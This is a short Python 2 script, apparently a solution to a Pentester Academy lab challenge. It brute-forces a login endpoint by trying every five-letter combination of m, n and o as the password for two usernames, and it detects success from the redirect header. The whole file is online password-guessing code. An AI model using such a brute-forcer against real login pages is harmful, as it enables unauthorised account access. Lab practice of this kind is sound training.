import httplib		
password=[]		
for a in ['m','n','o']:		    
	for b in ['m','n','o']:		        
		for c in ['m','n','o']:		            
			for d in ['m','n','o']:		                
				for e in ['m','n','o']:		                     
					password.append(a+b+c+d+e)		
user=['admin','nick']		
for u in user:		    
	for x in password:		        
		location='http://pentesteracademylab.appspot.com/lab/webapp/auth/1/login'		        
		request=httplib.HTTPConnection('pentesteracademylab.appspot.com')		        
		request.request("HEAD",'http://pentesteracademylab.appspot.com/lab/webapp/auth/1/loginscript?email='+u+'%40pentesteracademy.com&password='+x)
		response=request.getresponse()		        
		if response.getheader('Location')!=location:		            
			print "Challenge Cracked"		            
			print "Username: ",u		           
			print "Password: ",x		           
			print "Location is: "+response.getheader("Location")		            
			break;		        
		else:		            
			print "User: "+u+" Password: "+x+" Failed"